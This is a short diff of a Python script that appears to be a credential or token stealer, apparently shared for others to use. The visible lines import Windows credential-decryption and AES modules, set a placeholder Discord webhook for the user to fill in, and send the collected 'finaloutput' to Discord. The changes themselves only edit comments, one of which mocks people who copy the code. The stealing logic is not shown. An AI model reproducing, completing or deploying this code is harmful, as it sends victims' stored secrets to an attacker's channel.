@@ -10,9 +10,6 @@ import ctypes
 import requests
 from Crypto.Cipher import AES
 import win32crypt
-
-# this is what your webhook should look like.
-
 # remove the example webhook in between "webhook" with your own
 
 webhook = "put your token here fcking skid lol"
@@ -355,3 +352,4 @@ if finaloutput.strip() == "":
 else:
     sendToDiscord(finaloutput)
 
+#thanks for stealing my code for free lol
